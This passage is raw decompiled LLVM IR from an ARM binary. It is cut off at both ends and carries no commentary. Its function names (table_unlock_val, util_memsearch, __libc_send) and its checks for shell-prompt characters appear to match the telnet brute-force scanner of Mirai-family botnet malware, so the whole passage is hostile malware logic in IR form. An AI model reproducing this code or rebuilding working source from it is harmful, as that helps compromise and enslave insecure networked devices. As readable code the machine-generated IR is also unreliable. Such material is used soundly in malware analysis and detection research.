  br label %dec_label_pc_f508

dec_label_pc_f4e4:                                ; preds = %dec_label_pc_f508
  %v1_f4e4 = add i32 %v0_f500, -2
  %v2_f4e4 = inttoptr i32 %v1_f4e4 to i8*
  %v3_f4e4 = load i8, i8* %v2_f4e4, align 1
  %v4_f4e4 = zext i8 %v3_f4e4 to i32
  store i32 %v4_f4e4, i32* %r2.global-to-local, align 4
  %v2_f4e8 = icmp ugt i8 %v3_f4e4, 61
  store i1 %v2_f4e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4e8 = icmp eq i8 %v3_f4e4, 62
  store i1 %v7_f4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4e8, label %dec_label_pc_f778, label %bb448

bb448:                                            ; preds = %dec_label_pc_f4e4
  %v3_f4ec = icmp ugt i8 %v3_f4e4, 57
  store i1 %v3_f4ec, i1* %cpsr_c.global-to-local, align 1
  %v8_f4ec = icmp eq i8 %v3_f4e4, 58
  store i1 %v8_f4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4ec, label %dec_label_pc_f778, label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %bb448
  %v2_f4f4 = icmp ugt i8 %v3_f4e4, 35
  store i1 %v2_f4f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4f4 = icmp eq i8 %v3_f4e4, 36
  store i1 %v7_f4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4f4, label %dec_label_pc_f778, label %dec_label_pc_f4fc

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f4f4
  %v2_f4fc = icmp ugt i8 %v3_f4e4, 34
  store i1 %v2_f4fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4fc = icmp eq i8 %v3_f4e4, 35
  store i1 %v7_f4fc, i1* %cpsr_z.global-to-local, align 1
  %v1_f500 = add i32 %v0_f500, -1
  store i32 %v1_f500, i32* %r3.global-to-local, align 4
  br i1 %v7_f4fc, label %dec_label_pc_f778, label %dec_label_pc_f508

dec_label_pc_f508:                                ; preds = %dec_label_pc_f508.preheader, %dec_label_pc_f4fc
  %v0_f500 = phi i32 [ %v2_f4d8, %dec_label_pc_f508.preheader ], [ %v1_f500, %dec_label_pc_f4fc ]
  %v0_f508 = phi i32 [ %v1_f4a8, %dec_label_pc_f508.preheader ], [ %v1_f508, %dec_label_pc_f4fc ]
  %v1_f508 = add i32 %v0_f508, -1
  store i32 %v1_f508, i32* %r1.global-to-local, align 4
  %v2_f508 = icmp ne i32 %v0_f508, 0
  store i1 %v2_f508, i1* %cpsr_c.global-to-local, align 1
  %v7_f508 = icmp eq i32 %v0_f508, 1
  store i1 %v7_f508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f508, label %dec_label_pc_f510, label %dec_label_pc_f4e4

dec_label_pc_f510:                                ; preds = %dec_label_pc_f508, %dec_label_pc_f4a4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f514 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_f524 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  %v3_f528 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f524, i32* %r2.global-to-local, align 4
  %v1_f530 = add i32 %v3_f528, -1
  store i32 %v1_f530, i32* %r3.global-to-local, align 4
  %v0_f534 = load i32, i32* @sb, align 4
  store i32 %v0_f534, i32* %r0.global-to-local, align 4
  %v0_f538 = load i32, i32* @r6, align 4
  %v1_f538 = add i32 %v0_f538, 24
  %v2_f538 = inttoptr i32 %v1_f538 to i32*
  %v3_f538 = load i32, i32* %v2_f538, align 4
  store i32 %v3_f538, i32* %r1.global-to-local, align 4
  %v4_f53c = call i32 @util_memsearch(i32 %v0_f534, i32 %v3_f538, i32 %v3_f524, i32 %v1_f530)
  store i32 %v4_f53c, i32* %r0.global-to-local, align 4
  %v1_f540 = add i32 %v4_f53c, 1
  store i32 %v1_f540, i32* @r7, align 4
  %v2_f540 = icmp eq i32 %v4_f53c, -1
  store i1 %v2_f540, i1* %cpsr_c.global-to-local, align 1
  %v7_f540 = icmp eq i32 %v1_f540, 0
  store i1 %v7_f540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f540, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f510
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f510, %bb449
  %v0_f548 = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f510 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f548, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f994 = call i32 @table_lock_val(i32 25)
  br i1 %v0_f548, label %dec_label_pc_f990, label %dec_label_pc_f558

dec_label_pc_f558:                                ; preds = %thread-pre-split124, %dec_label_pc_f778
  %storemerge = phi i32 [ %v1_f780, %dec_label_pc_f778 ], [ %v1_f994, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f558 = load i32, i32* @r6, align 4
  %v1_f558 = inttoptr i32 %v0_f558 to i32*
  %v2_f558 = load i32, i32* %v1_f558, align 4
  store i32 %v2_f558, i32* %r3.global-to-local, align 4
  %v1_f55c = add i32 %v0_f558, 4
  %v2_f55c = inttoptr i32 %v1_f55c to i32*
  %v3_f55c = load i32, i32* %v2_f55c, align 4
  store i32 %v3_f55c, i32* %r0.global-to-local, align 4
  %v1_f560 = add i32 %v2_f558, 13
  %v2_f560 = inttoptr i32 %v1_f560 to i8*
  %v3_f560 = load i8, i8* %v2_f560, align 1
  %v4_f560 = zext i8 %v3_f560 to i32
  store i32 %v4_f560, i32* %r2.global-to-local, align 4
  %v1_f564 = add i32 %v2_f558, 4
  %v2_f564 = inttoptr i32 %v1_f564 to i32*
  %v3_f564 = load i32, i32* %v2_f564, align 4
  store i32 %v3_f564, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f56c = call i32 @__libc_send(i32 %v3_f55c, i32 %v3_f564, i32 %v4_f560, i32 16384)
  store i32 %v4_f56c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f574 = load i32, i32* @r6, align 4
  %v1_f574 = add i32 %v0_f574, 4
  %v2_f574 = inttoptr i32 %v1_f574 to i32*
  %v3_f574 = load i32, i32* %v2_f574, align 4
  store i32 %v3_f574, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f580 = call i32 @__libc_send(i32 %v3_f574, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 %v4_f580, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f588 = load i32, i32* @r6, align 4
  %v2_f588 = add i32 %v1_f588, 12
  %v3_f588 = inttoptr i32 %v2_f588 to i32*
  store i32 5, i32* %v3_f588, align 4
  br label %dec_label_pc_f58c

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f1a0, %bb436, %dec_label_pc_f69c, %dec_label_pc_f7d4, %dec_label_pc_f740, %dec_label_pc_f818, %dec_label_pc_f558
  %v0_f58c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f58c = icmp eq i32 %v0_f58c, 0
  store i1 %v2_f58c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f58c, label %dec_label_pc_ed74.loopexit, label %dec_label_pc_ef10

dec_label_pc_f598:                                ; preds = %dec_label_pc_edf4
  %v1_f598 = add i32 %v0_edf4, 24
  %v2_f598 = inttoptr i32 %v1_f598 to i32*
  %v3_f598 = load i32, i32* %v2_f598, align 4
  store i32 %v3_f598, i32* %r2.global-to-local, align 4
  %v1_f59c = add i32 %v3_f598, -1
  store i32 %v1_f59c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5a0 = icmp eq i32 %v1_f59c, 0
  store i1 %v2_f5a0, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f59c, 1
  br i1 %tmp450, label %dec_label_pc_f614, label %dec_label_pc_f5a8

dec_label_pc_f5a8:                                ; preds = %dec_label_pc_f598
  %v2_f5a8 = add i32 %v1_f59c, %v0_edf4
  store i32 %v2_f5a8, i32* %r3.global-to-local, align 4
  %v1_f5ac = add i32 %v2_f5a8, 28
  %v2_f5ac = inttoptr i32 %v1_f5ac to i8*
  %v3_f5ac = load i8, i8* %v2_f5ac, align 1
  %v4_f5ac = zext i8 %v3_f5ac to i32
  store i32 %v4_f5ac, i32* %r3.global-to-local, align 4
  %v2_f5b0 = icmp ugt i8 %v3_f5ac, 61
  store i1 %v2_f5b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5b0 = icmp eq i8 %v3_f5ac, 62
  store i1 %v7_f5b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5b0, label %dec_label_pc_f72c, label %bb451

bb451:                                            ; preds = %dec_label_pc_f5a8
  %v3_f5b4 = icmp ugt i8 %v3_f5ac, 57
  store i1 %v3_f5b4, i1* %cpsr_c.global-to-local, align 1
  %v8_f5b4 = icmp eq i8 %v3_f5ac, 58
  store i1 %v8_f5b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5b4, label %dec_label_pc_f72c, label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %bb451
  %v2_f5bc = icmp ugt i8 %v3_f5ac, 35
  store i1 %v2_f5bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5bc = icmp eq i8 %v3_f5ac, 36
  store i1 %v7_f5bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5bc, label %dec_label_pc_f72c, label %dec_label_pc_f5c4

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f5bc
  %v2_f5c4 = icmp ugt i8 %v3_f5ac, 34
  store i1 %v2_f5c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c4 = icmp eq i8 %v3_f5ac, 35
  store i1 %v7_f5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5c4, label %dec_label_pc_f72c, label %dec_label_pc_f5cc

dec_label_pc_f5cc:                                ; preds = %dec_label_pc_f5c4
  %v2_f5cc = icmp ugt i8 %v3_f5ac, 36
  store i1 %v2_f5cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5cc = icmp eq i8 %v3_f5ac, 37
  store i1 %v7_f5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5cc, label %dec_label_pc_f72c, label %dec_label_pc_f60c.preheader

dec_label_pc_f60c.preheader:                      ; preds = %dec_label_pc_f5cc
  %v3_f5d0 = add i32 %v0_edf4, 28
  %v2_f5d4 = add i32 %v3_f5d0, %v3_f598
  store i32 %v2_f5d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f60c

dec_label_pc_f5e0:                                ; preds = %dec_label_pc_f60c
  %v1_f5e0 = add i32 %v0_f604, -2
  %v2_f5e0 = inttoptr i32 %v1_f5e0 to i8*
  %v3_f5e0 = load i8, i8* %v2_f5e0, align 1
  %v4_f5e0 = zext i8 %v3_f5e0 to i32
  store i32 %v4_f5e0, i32* %r2.global-to-local, align 4
  %v2_f5e4 = icmp ugt i8 %v3_f5e0, 61
  store i1 %v2_f5e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e4 = icmp eq i8 %v3_f5e0, 62
  store i1 %v7_f5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5e4, label %dec_label_pc_f72c, label %bb452

bb452:                                            ; preds = %dec_label_pc_f5e0
  %v3_f5e8 = icmp ugt i8 %v3_f5e0, 57
  store i1 %v3_f5e8, i1* %cpsr_c.global-to-local, align 1
  %v8_f5e8 = icmp eq i8 %v3_f5e0, 58
  store i1 %v8_f5e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5e8, label %dec_label_pc_f72c, label %dec_label_pc_f5f0

dec_label_pc_f5f0:                                ; preds = %bb452
  %v2_f5f0 = icmp ugt i8 %v3_f5e0, 35
  store i1 %v2_f5f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f0 = icmp eq i8 %v3_f5e0, 36
  store i1 %v7_f5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f0, label %dec_label_pc_f72c, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f5f0
  %v2_f5f8 = icmp ugt i8 %v3_f5e0, 34
  store i1 %v2_f5f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f8 = icmp eq i8 %v3_f5e0, 35
  store i1 %v7_f5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f8, label %dec_label_pc_f72c, label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %dec_label_pc_f5f8
  %v2_f600 = icmp ugt i8 %v3_f5e0, 36
  store i1 %v2_f600, i1* %cpsr_c.global-to-local, align 1
  %v7_f600 = icmp eq i8 %v3_f5e0, 37
  store i1 %v7_f600, i1* %cpsr_z.global-to-local, align 1
  %v1_f604 = add i32 %v0_f604, -1
  store i32 %v1_f604, i32* %r3.global-to-local, align 4
  br i1 %v7_f600, label %dec_label_pc_f72c, label %dec_label_pc_f60c

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f60c.preheader, %dec_label_pc_f600
  %v0_f604 = phi i32 [ %v2_f5d4, %dec_label_pc_f60c.preheader ], [ %v1_f604, %dec_label_pc_f600 ]
  %v0_f60c = phi i32 [ %v1_f59c, %dec_label_pc_f60c.preheader ], [ %v1_f60c, %dec_label_pc_f600 ]
  %v1_f60c = add i32 %v0_f60c, -1
  store i32 %v1_f60c, i32* %r1.global-to-local, align 4
  %v2_f60c = icmp ne i32 %v0_f60c, 0
  store i1 %v2_f60c, i1* %cpsr_c.global-to-local, align 1
  %v7_f60c = icmp eq i32 %v0_f60c, 1
  store i1 %v7_f60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f60c, label %dec_label_pc_f614, label %dec_label_pc_f5e0

dec_label_pc_f614:                                ; preds = %dec_label_pc_f60c, %dec_label_pc_f598
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f618 = call i32 @table_unlock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f620 = call i32 @table_unlock_val(i32 27)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_f630 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_f630, i32* @r4, align 4
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_f644 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_f648 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f644, 16777216
  %v1_f64c = sdiv i32 %sext, 16777216
  store i32 %v1_f64c, i32* @r5, align 4
  %v0_f650 = load i32, i32* @r4, align 4
  store i32 %v0_f650, i32* %r2.global-to-local, align 4
  %v1_f654 = add i32 %v3_f648, -1
  store i32 %v1_f654, i32* %r3.global-to-local, align 4
  %v0_f658 = load i32, i32* @sb, align 4
  store i32 %v0_f658, i32* %r0.global-to-local, align 4
  %v0_f65c = load i32, i32* @r6, align 4
  %v1_f65c = add i32 %v0_f65c, 24
  %v2_f65c = inttoptr i32 %v1_f65c to i32*
  %v3_f65c = load i32, i32* %v2_f65c, align 4
  store i32 %v3_f65c, i32* %r1.global-to-local, align 4
  %v4_f660 = call i32 @util_memsearch(i32 %v0_f658, i32 %v3_f65c, i32 %v0_f650, i32 %v1_f654)
  store i32 %v4_f660, i32* %r0.global-to-local, align 4
  %v2_f664 = icmp eq i32 %v4_f660, -1
  store i1 %v2_f664, i1* %cpsr_c.global-to-local, align 1
  %v7_f664 = icmp eq i32 %v4_f660, -1
  store i1 %v7_f664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f664, label %dec_label_pc_f674, label %dec_label_pc_f69c

dec_label_pc_f674:                                ; preds = %dec_label_pc_f614
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f674 = load i32, i32* %stack_var_-60, align 4
  %v0_f678 = load i32, i32* @r5, align 4
  store i32 %v0_f678, i32* %r2.global-to-local, align 4
  %v1_f67c = add i32 %v3_f674, -1
  store i32 %v1_f67c, i32* %r3.global-to-local, align 4
  %v0_f680 = load i32, i32* @sb, align 4
  store i32 %v0_f680, i32* %r0.global-to-local, align 4
  %v0_f684 = load i32, i32* @r6, align 4
  %v1_f684 = add i32 %v0_f684, 24
  %v2_f684 = inttoptr i32 %v1_f684 to i32*
  %v3_f684 = load i32, i32* %v2_f684, align 4
  store i32 %v3_f684, i32* %r1.global-to-local, align 4
  %v4_f688 = call i32 @util_memsearch(i32 %v0_f680, i32 %v3_f684, i32 %v0_f678, i32 %v1_f67c)
  store i32 %v4_f688, i32* %r0.global-to-local, align 4
  %v1_f68c = add i32 %v4_f688, 1
  store i32 %v1_f68c, i32* @r7, align 4
  %v2_f68c = icmp eq i32 %v4_f688, -1
  store i1 %v2_f68c, i1* %cpsr_c.global-to-local, align 1
  %v7_f68c = icmp eq i32 %v1_f68c, 0
  store i1 %v7_f68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f68c, label %dec_label_pc_f950, label %dec_label_pc_f69c

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f674, %dec_label_pc_f614
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f6a0 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f6a8 = call i32 @table_lock_val(i32 27)
  store i32 %v1_f6a8, i32* %r0.global-to-local, align 4
  %v0_f6ac = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6ac = icmp eq i32 %v0_f6ac, 0
  store i1 %v2_f6ac, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f6ac, 1
  br i1 %tmp453, label %dec_label_pc_f58c, label %dec_label_pc_f740

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f124
  store i32 %v2_f6bc, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_18ffc.205 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f6bc, i32* @r0, align 4
  store i32 %v2_f6d0, i32* @sl, align 4
  %v0_f6d4 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f6d0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18ff3.207 to i32), i32* @r1, align 4
  %v0_f6e4 = call i32 @memcpy()
  store i32 %v0_f6e4, i32* %r0.global-to-local, align 4
  %v0_f6e8 = load i32, i32* @r6, align 4
  %v1_f6e8 = add i32 %v0_f6e8, 24
  %v2_f6e8 = inttoptr i32 %v1_f6e8 to i32*
  %v3_f6e8 = load i32, i32* %v2_f6e8, align 4
  %v0_f6ec = load i32, i32* @r4, align 4
  %v1_f6ec = add i32 %v0_f6ec, 2
  store i32 %v1_f6ec, i32* %r2.global-to-local, align 4
  %v0_f6f0 = load i32, i32* @sb, align 4
  %v2_f6f0 = add i32 %v0_f6f0, %v3_f6e8
  store i32 %v2_f6f0, i32* @r3, align 4
  %v3_f6f4 = icmp uge i32 %v2_f6f0, %v1_f6ec
  store i1 %v3_f6f4, i1* %cpsr_c.global-to-local, align 1
  %v9_f6f4 = icmp eq i32 %v2_f6f0, %v1_f6ec
  store i1 %v9_f6f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f6f8 = xor i1 %v3_f6f4, true
  %v3_f6f8 = or i1 %v9_f6f4, %v2_f6f8
  br i1 %v3_f6f8, label %dec_label_pc_f6b8.dec_label_pc_f1a0.loopexit_crit_edge, label %dec_label_pc_f6fc

dec_label_pc_f6b8.dec_label_pc_f1a0.loopexit_crit_edge: ; preds = %dec_label_pc_f6b8
  %v0_f1a0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f1a0

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6b8
  %v2_f6fc = inttoptr i32 %v1_f6ec to i8*
  %v3_f6fc = load i8, i8* %v2_f6fc, align 1
  %v4_f6fc = zext i8 %v3_f6fc to i32
  store i32 %v4_f6fc, i32* %r3.global-to-local, align 4
  %v2_f700 = icmp ugt i8 %v3_f6fc, 30
  store i1 %v2_f700, i1* %cpsr_c.global-to-local, align 1
  %v7_f700 = icmp eq i8 %v3_f6fc, 31
  store i1 %v7_f700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f700, label %dec_label_pc_f830, label %dec_label_pc_f708

dec_label_pc_f708:                                ; preds = %dec_label_pc_f6fc
  %v1_f708 = inttoptr i32 %v0_f6ec to i8*
  %v2_f708 = load i8, i8* %v1_f708, align 1
  %v3_f708 = zext i8 %v2_f708 to i32
  store i32 %v3_f708, i32* %r3.global-to-local, align 4
  %v2_f70c = icmp ugt i8 %v2_f708, -4
  store i1 %v2_f70c, i1* %cpsr_c.global-to-local, align 1
  %v7_f70c = icmp eq i8 %v2_f708, -3
  store i1 %v7_f70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f70c, label %.thread138, label %dec_label_pc_f71c

.thread138:                                       ; preds = %dec_label_pc_f708
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f708, align 1
  %v0_f718.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f718.pr.pr, label %dec_label_pc_f138, label %.thread138.dec_label_pc_f71cthread-pre-split_crit_edge

.thread138.dec_label_pc_f71cthread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f71c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f71c

dec_label_pc_f71c:                                ; preds = %dec_label_pc_f708, %.thread138.dec_label_pc_f71cthread-pre-split_crit_edge
  %v0_f71c.pr = phi i32 [ %v0_f71c.pr.pre, %.thread138.dec_label_pc_f71cthread-pre-split_crit_edge ], [ %v3_f708, %dec_label_pc_f708 ]
  %v2_f71c = icmp ugt i32 %v0_f71c.pr, 250
  store i1 %v2_f71c, i1* %cpsr_c.global-to-local, align 1
  %v7_f71c = icmp eq i32 %v0_f71c.pr, 251
  store i1 %v7_f71c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f71c, label %bb454, label %dec_label_pc_f138

bb454:                                            ; preds = %dec_label_pc_f71c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f724 = load i32, i32* @r4, align 4
  %v4_f724 = inttoptr i32 %v3_f724 to i8*
  store i8 -3, i8* %v4_f724, align 1
  br label %dec_label_pc_f138

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f5e0, %dec_label_pc_f600, %dec_label_pc_f5f8, %dec_label_pc_f5f0, %bb452, %dec_label_pc_f5cc, %dec_label_pc_f5a8, %dec_label_pc_f5c4, %dec_label_pc_f5bc, %bb451
  %v0_f730 = phi i32 [ %v1_f59c, %dec_label_pc_f5cc ], [ %v1_f59c, %dec_label_pc_f5a8 ], [ %v1_f59c, %dec_label_pc_f5c4 ], [ %v1_f59c, %dec_label_pc_f5bc ], [ %v1_f59c, %bb451 ], [ %v1_f60c, %bb452 ], [ %v1_f60c, %dec_label_pc_f5f0 ], [ %v1_f60c, %dec_label_pc_f5f8 ], [ %v1_f60c, %dec_label_pc_f600 ], [ %v1_f60c, %dec_label_pc_f5e0 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f730 = add i32 %v0_f730, 1
  store i32 %v1_f730, i32* @r7, align 4
  %v1_f734 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f73c = call i32 @table_lock_val(i32 27)
  store i32 %v1_f73c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %dec_label_pc_f69c, %dec_label_pc_f72c
  %v0_f740 = load i32, i32* @r6, align 4
  %v1_f740 = inttoptr i32 %v0_f740 to i32*
  %v2_f740 = load i32, i32* %v1_f740, align 4
  store i32 %v2_f740, i32* %r3.global-to-local, align 4
  %v1_f744 = add i32 %v0_f740, 4
  %v2_f744 = inttoptr i32 %v1_f744 to i32*
  %v3_f744 = load i32, i32* %v2_f744, align 4
  store i32 %v3_f744, i32* %r0.global-to-local, align 4
  %v1_f748 = add i32 %v2_f740, 12
  %v2_f748 = inttoptr i32 %v1_f748 to i8*
  %v3_f748 = load i8, i8* %v2_f748, align 1
  %v4_f748 = zext i8 %v3_f748 to i32
  store i32 %v4_f748, i32* %r2.global-to-local, align 4
  %v1_f74c = inttoptr i32 %v2_f740 to i32*
  %v2_f74c = load i32, i32* %v1_f74c, align 4
  store i32 %v2_f74c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f754 = call i32 @__libc_send(i32 %v3_f744, i32 %v2_f74c, i32 %v4_f748, i32 16384)
  store i32 %v4_f754, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f75c = load i32, i32* @r6, align 4
  %v1_f75c = add i32 %v0_f75c, 4
  %v2_f75c = inttoptr i32 %v1_f75c to i32*
  %v3_f75c = load i32, i32* %v2_f75c, align 4
  store i32 %v3_f75c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f768 = call i32 @__libc_send(i32 %v3_f75c, i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), i32 2, i32 16384)
  store i32 %v4_f768, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f770 = load i32, i32* @r6, align 4
  %v2_f770 = add i32 %v1_f770, 12
  %v3_f770 = inttoptr i32 %v2_f770 to i32*
  store i32 4, i32* %v3_f770, align 4
  br label %dec_label_pc_f58c

dec_label_pc_f778:                                ; preds = %dec_label_pc_f4e4, %dec_label_pc_f4fc, %dec_label_pc_f4f4, %bb448, %dec_label_pc_f4d0, %dec_label_pc_f4b4, %dec_label_pc_f4c8, %bb447
  %v0_f77c = phi i32 [ %v1_f4a8, %dec_label_pc_f4d0 ], [ %v1_f4a8, %dec_label_pc_f4b4 ], [ %v1_f4a8, %dec_label_pc_f4c8 ], [ %v1_f4a8, %bb447 ], [ %v1_f508, %bb448 ], [ %v1_f508, %dec_label_pc_f4f4 ], [ %v1_f508, %dec_label_pc_f4fc ], [ %v1_f508, %dec_label_pc_f4e4 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f77c = add i32 %v0_f77c, 1
  store i32 %v1_f77c, i32* @r7, align 4
  %v1_f780 = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_f558

dec_label_pc_f788:                                ; preds = %dec_label_pc_ee94
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f794 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_f628, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f7a4 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f7a4, i32* %r0.global-to-local, align 4
  %v3_f7a8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f7a4, i32* %r2.global-to-local, align 4
  %v1_f7b0 = add i32 %v3_f7a8, -1
  store i32 %v1_f7b0, i32* %r3.global-to-local, align 4
  %v0_f7b4 = load i32, i32* @r6, align 4
  %v1_f7b4 = add i32 %v0_f7b4, 24
  %v2_f7b4 = inttoptr i32 %v1_f7b4 to i32*
  %v3_f7b4 = load i32, i32* %v2_f7b4, align 4
  store i32 %v3_f7b4, i32* %r1.global-to-local, align 4
  %v0_f7b8 = load i32, i32* @sb, align 4
  store i32 %v0_f7b8, i32* %r0.global-to-local, align 4
  %v4_f7bc = call i32 @util_memsearch(i32 %v0_f7b8, i32 %v3_f7b4, i32 %v3_f7a4, i32 %v1_f7b0)
  store i32 %v4_f7bc, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f7c8 = call i32 @table_lock_val(i32 9)
  store i32 %v1_f7c8, i32* %r0.global-to-local, align 4
  %v0_f7cc = load i32, i32* @r7, align 4
  %v2_f7cc = icmp eq i32 %v0_f7cc, -1
  store i1 %v2_f7cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7cc = icmp eq i32 %v0_f7cc, -1
  store i1 %v7_f7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7cc, label %dec_label_pc_ed74.loopexit, label %dec_label_pc_f7d4

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f788
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7d4 = icmp eq i32 %v0_f7cc, 0
  store i1 %v2_f7d4, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f7cc, 1
  br i1 %tmp455, label %dec_label_pc_f58c, label %dec_label_pc_f7dc

dec_label_pc_f7dc:                                ; preds = %dec_label_pc_f7d4
  %v0_f7dc = load i32, i32* @r6, align 4
  %v1_f7dc = add i32 %v0_f7dc, 20
